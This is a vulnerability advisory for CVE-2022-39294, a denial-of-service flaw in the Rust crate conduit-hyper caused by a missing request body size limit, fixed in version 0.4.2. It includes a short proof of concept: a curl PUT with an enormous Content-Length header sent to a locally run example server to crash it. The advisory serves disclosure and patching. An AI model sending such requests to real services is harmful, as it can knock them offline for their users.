---
description: CVE-2022-39294 High severity. Missing limit checks in conduit-hyper leads to denial of service
title: conduit-hyper missing request size limit DoS
date_published: "2022-11-01"
last_updated: "2022-11-01"
xray_id:
vul_id: CVE-2022-39294
cvss: 7.5
severity: high
discovered_by: Ori Hollander
type: vulnerability
---
## Summary
A missing request size limit for HTTP requests in conduit-hyper can allow network attackers to perform denial of service

## Component

[conduit-hyper](https://crates.io/crates/conduit-hyper)

## Affected versions

[0.2.0-alpha.3, 0.4.2), fixed in 0.4.2



## Description

conduit-hyper would not, by default, set a limit for the size of the request body. That meant if a malicious peer would send a request with a very large `Content-Length` header (even if the body itself is not very large), the Rust allocator would panic (due to a failed allocation) and the process would crash.



## PoC

```bash
git clone https://github.com/conduit-rust/conduit-hyper

cd conduit-hyper && cargo run --example server

curl -v -X PUT "http://127.0.0.1:12345/" --data `python3 -c
"import sys; sys.stdout.write('a'*10000)"` -H
"Content-Length: 11111111111111111111"
```



## Vulnerability Mitigations

No mitigations are provided for this vulnerability.

In order to fully fix this vulnerability, we recommend upgrading conduit-hyper to version 0.4.2



## References

[GHSA](https://github.com/conduit-rust/conduit-hyper/security/advisories/GHSA-9398-5ghf-7pr6)